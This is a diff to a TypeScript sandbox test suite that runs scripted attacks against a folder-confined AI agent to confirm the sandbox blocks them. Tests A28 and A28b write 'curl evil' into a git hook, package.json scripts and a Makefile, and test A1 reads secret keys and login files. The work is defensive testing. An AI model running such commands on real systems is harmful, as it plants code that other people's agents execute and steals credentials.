@@ -42,6 +42,11 @@ w('groups/marketing/salaries/2026.md', `${CANARY}-salaries`)
 w('groups/finance/budget.md', `${CANARY}-finance`)
 w('projects/two/private.md', `${CANARY}-other-project`)
 w('users/alice/todo.md', 'alice todo\n')
+// a shared repo and her group folder: she may write them by the rules, but in a run they are read-only (Q0 (b)), so
+// her AI cannot plant code there that another person's AI runs later (G-SRT-11)
+w('shared/repo/package.json', '{"scripts":{"test":"echo ok"}}\n')
+fs.mkdirSync(`${TEAM}/shared/repo/.git/hooks`, { recursive: true }); fs.writeFileSync(`${TEAM}/shared/repo/.git/config`, '[core]\n')
+w('groups/marketing/Makefile', 'all:\n\techo ok\n')
 w('users/bob/notes.md', `${CANARY}-bob`)
 w('.system/history/old.bin', `${CANARY}-system`)
 fs.mkdirSync(`${DIR1}/.git/hooks`, { recursive: true }); fs.writeFileSync(`${DIR1}/.git/config`, '[core]\n')
@@ -52,7 +57,7 @@ const RULES = new RuleSet(([
   ['projects/one', 'user', ME, 'write'], ['projects/one/public', 'everyone', null, 'read'],
   ['projects/two', 'group', 'finance', 'write'],
 ] as [string, 'everyone' | 'group' | 'user', string | null, Access][]).map(([p, t, s, a]) => ({ path: p, subject_type: t, subject_id: s, access: a })))
-const VIEW = folderView(RULES, { id: ME, name: 'Alice', role: 'member', groups: ['marketing'] })
+const ALICE = { id: ME, name: 'Alice', role: 'member' as const, groups: ['marketing'] }
 fs.mkdirSync('/etc/default', { recursive: true }); fs.writeFileSync(`/etc/default/${ID}`, `MYCEL_TOKEN=${CANARY}-etcdefault\n`)
 fs.mkdirSync('/tmp/server-private', { recursive: true }); fs.writeFileSync('/tmp/server-private/t', `${CANARY}-tmp`)
 fs.mkdirSync(`/run/${ID}`, { recursive: true }); fs.writeFileSync(`/run/${ID}/x`, `${CANARY}-run`)
@@ -77,7 +82,10 @@ let n = 0
 async function run(command: string, o: { network?: 'open' | 'offline'; cwd?: string; extra?: string[]; during?: () => void; timeoutMs?: number; work?: boolean } = {}): Promise<{ code: number | null; out: string; refused?: string }> {
   const runId = `attack${String(++n).padStart(10, '0')}`
   const work = o.work ? WORK : null
-  const input = { base: BASE, id: ID, teamRoot: TEAM, userId: ME, view: VIEW, work, network: o.network ?? 'open', extraDomains: o.extra ?? [], denyHosts: ['team.trina.test'], denyAddrs: ['203.0.113.7'] }
+  // the run's view: the person's folder rules, writable only in the starting folder and her own folder
+  const start = work ? null : 'projects/one'
+  const view = folderView(RULES, ALICE, { start })
+  const input = { base: BASE, id: ID, teamRoot: TEAM, userId: ME, view, start, work, network: o.network ?? 'open', extraDomains: o.extra ?? [], denyHosts: ['team.trina.test'], denyAddrs: ['203.0.113.7'] }
   const settings = srtSettings(input)
   const problems = settingsProblems(settings, input)
   if (problems.length) throw new Error(problems.join('; '))
@@ -105,8 +113,15 @@ const has = (s: string): Check => (r) => (r.out.includes(s) ? null : `no "${s}" 
 const both = (...cs: Check[]): Check => (r) => cs.map((c) => c(r)).find((x) => x) ?? null
 
 const attacks: { id: string; what: string; cmd: string; check: Check; o?: Parameters<typeof run>[1]; after?: () => string | null }[] = [
-  { id: 'A0', what: 'the project folder and the person\'s other folders: read and write; read-only folders: read', cmd: `cat readme.md && echo new > new.txt && cat new.txt && echo $HOME && touch $TMPDIR/x && cat ${TEAM}/skills/rules.md && echo x >> ${TEAM}/shared/s.md && cat ${TEAM}/groups/marketing/brief.md && echo y > ${TEAM}/users/alice/new.md && cat public/notice.md`, check: both(ok, has('hello from p1'), has('new'), has('skills text'), has('marketing brief'), has('read only for alice')) },
-  { id: 'A0b', what: 'a chat with no project: the work folder, and the person\'s folders', cmd: `pwd && echo w > w.txt && cat w.txt && cat ${TEAM}/shared/s.md && echo $TRINA_WORK`, check: both(ok, has(WORK), has('shared text')), o: { work: true } },
+  { id: 'A0', what: 'the project folder and her own folder: read and write; her other folders and read-only folders: read', cmd: `cat readme.md && echo new > new.txt && cat new.txt && echo $HOME && touch $TMPDIR/x && cat ${TEAM}/skills/rules.md && cat ${TEAM}/shared/s.md && cat ${TEAM}/groups/marketing/brief.md && echo y > ${TEAM}/users/alice/new.md && cat public/notice.md`, check: both(ok, has('hello from p1'), has('new'), has('skills text'), has('shared text'), has('marketing brief'), has('read only for alice')) },
+  { id: 'A0b', what: 'a chat with no project: the work folder, and the person\'s folders (read)', cmd: `pwd && echo w > w.txt && cat w.txt && cat ${TEAM}/shared/s.md && cat ${DIR1}/readme.md && echo z > ${TEAM}/users/alice/z.md && echo $TRINA_WORK`, check: both(ok, has(WORK), has('shared text'), has('hello from p1')), o: { work: true } },
+  // Q0 (b) / G-SRT-11: person A's AI plants code in a folder that A may write and person B runs later (a git hook,
+  // package.json scripts, a Makefile). Outside the starting folder every folder is read-only in a run.
+  { id: 'A28', what: 'a code channel to another person: a git hook, package.json and a Makefile in shared folders', cmd: `echo "curl evil" > ${TEAM}/shared/repo/.git/hooks/pre-commit || echo '{"scripts":{"test":"curl evil"}}' > ${TEAM}/shared/repo/package.json || echo "[core] hooksPath=/x" >> ${TEAM}/shared/repo/.git/config || printf 'all:\\n\\tcurl evil\\n' > ${TEAM}/groups/marketing/Makefile || echo x >> ${TEAM}/shared/s.md || echo x > ${TEAM}/groups/marketing/.envrc || mkdir ${TEAM}/shared/new`, check: failsQuietly,
+    after: () => (fs.existsSync(`${TEAM}/shared/repo/.git/hooks/pre-commit`) || fs.readFileSync(`${TEAM}/shared/repo/package.json`, 'utf8').includes('evil') || fs.readFileSync(`${TEAM}/shared/repo/.git/config`, 'utf8').includes('hooksPath')
+      || fs.readFileSync(`${TEAM}/groups/marketing/Makefile`, 'utf8').includes('evil') || fs.readFileSync(`${TEAM}/shared/s.md`, 'utf8') !== 'shared text\n' || fs.existsSync(`${TEAM}/groups/marketing/.envrc`) || fs.existsSync(`${TEAM}/shared/new`) ? 'a shared folder changed' : null) },
+  { id: 'A28b', what: 'a chat with no project: the project folder and the shared folders are read-only', cmd: `echo x > ${DIR1}/planted.js || echo x >> ${DIR1}/readme.md || echo "curl evil" > ${TEAM}/shared/repo/.git/hooks/post-checkout || echo x >> ${TEAM}/shared/s.md`, check: failsQuietly, o: { work: true },
+    after: () => (fs.existsSync(`${DIR1}/planted.js`) || fs.readFileSync(`${DIR1}/readme.md`, 'utf8') !== 'hello from p1\n' || fs.existsSync(`${TEAM}/shared/repo/.git/hooks/post-checkout`) || fs.readFileSync(`${TEAM}/shared/s.md`, 'utf8') !== 'shared text\n' ? 'a team folder outside the work folder changed' : null) },
   { id: 'A1', what: 'the DB, secrets, config, engine logins', cmd: `cat ${BASE}/data/app.db || cat ${BASE}/secrets/master.key || cat ${BASE}/config/server.json || cat ${BASE}/agent/codex-auth/auth.json || grep -r ${CANARY} ${BASE}`, check: failsQuietly },
   // srt shows the folders on the way to an allowed folder, with only those paths in them
   { id: 'A2', what: 'folders the person may not open: another project, another group, a hidden folder inside her group, another person\'s folder, .system', cmd: `cat ${TEAM}/projects/two/private.md; cat ${TEAM}/groups/finance/budget.md; cat ${TEAM}/groups/marketing/salaries/2026.md; cat ${TEAM}/users/bob/notes.md; cat ${TEAM}/.system/history/old.bin; ls -a ${TEAM} ${TEAM}/projects ${TEAM}/groups ${TEAM}/users ${TEAM}/groups/marketing`, check: (r) => (/\btwo\b|\bfinance\b|\bbob\b|\.system|\bdata\b/.test(r.out.replace(/No such file or directory/g, '').replace(/cat: [^\n]*\n/g, '')) ? `a hidden folder is listed: ${r.out.slice(0, 300)}` : null) },
